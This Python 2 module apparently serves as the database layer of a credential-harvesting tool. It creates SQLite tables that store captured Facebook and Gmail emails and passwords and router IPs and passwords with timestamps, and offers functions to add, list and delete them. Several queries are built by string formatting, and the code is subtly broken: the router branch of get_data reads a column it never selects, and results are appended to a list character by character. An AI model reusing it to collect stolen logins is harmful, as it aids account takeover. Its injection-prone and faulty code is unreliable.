#coding utf-8
import sys
reload(sys)
sys.setdefaultencoding("utf-8")
import sqlite3
from time import gmtime, strftime
from os import getcwd
connect = sqlite3.connect(str(getcwd()) +"/Database/database.db")
connect.text_factory = str
c = connect.cursor()

facebook = []
gmail = []
def create_tables():
    c.execute("CREATE TABLE IF NOT EXISTS Facebook (id integer PRIMARY KEY AUTOINCREMENT, email text, password text,datestamp text)")
    c.execute("CREATE TABLE IF NOT EXISTS Gmail (id integer PRIMARY KEY AUTOINCREMENT, email text, password text,datestamp text)")
    c.execute("CREATE TABLE IF NOT EXISTS Route (id integer PRIMARY KEY AUTOINCREMENT,  ipaddress text,password text,datestamp text)")
    connect.commit()

def add_Face_db(email,password):
    dataestamp = str(strftime("%a, %d %b %Y %X ", gmtime()))
    c.execute("INSERT OR REPLACE  INTO  Facebook (email,password,datestamp) VALUES(?,?,?)",(email,password,dataestamp))
    connect.commit()

def add_Route_db(Ip,password):
    dataestamp = str(strftime("%a, %d %b %Y %X ", gmtime()))
    c.execute("INSERT OR REPLACE  INTO  Route (ipaddress,password,datestamp) VALUES(?,?,?)",(Ip,password,dataestamp))
    connect.commit()


def add_gmail_db(email,password):
    dataestamp = str(strftime("%a, %d %b %Y %X ", gmtime()))
    c.execute("INSERT or ignore INTO Gmail (email,password,datestamp) VALUES(?,?,?)",(email,password,dataestamp))
    connect.commit()

def delete_one(table,n):
    if table == "Route":
        cursor = c.execute("SELECT id,ipaddress,password,datestamp FROM %s where id= %d"%(table,int(n)))
        for row in cursor:
            z = (" DELETE: IP:%s Passowrd:%s Data:%s"%(row[1], row[2], row[3]))
    else:
        cursor = c.execute("SELECT id,email,password,datestamp FROM %s where id= %d"%(table,int(n)))
        for row in cursor:
            z = (" DELETE: IP:%s Passowrd:%s Data:%s"%(row[1], row[2], row[3]))
    c.execute("DELETE FROM %s WHERE id= %d"%(table,int(n)))
    connect.commit()
    return z

def get_data(service):
    new = []
    if service == "Route":
        cursor = c.execute("SELECT id,password,datestamp FROM %s"%(service))
    else:
        cursor = c.execute("SELECT id,email,password,datestamp FROM %s"%(service))
    for row in cursor:
        new += str(row[0]) + str(row[1])  + str(row[2]) + str(row[3])
    return new

def delete_db_all(n,db):
    for num in range(n):
        c.execute("DELETE FROM %s WHERE id= %s"%(db,num))
    if db != None:
        c.execute("UPDATE SQLITE_SEQUENCE set seq=0 WHERE name=\"%s\""%(db))
    connect.commit()
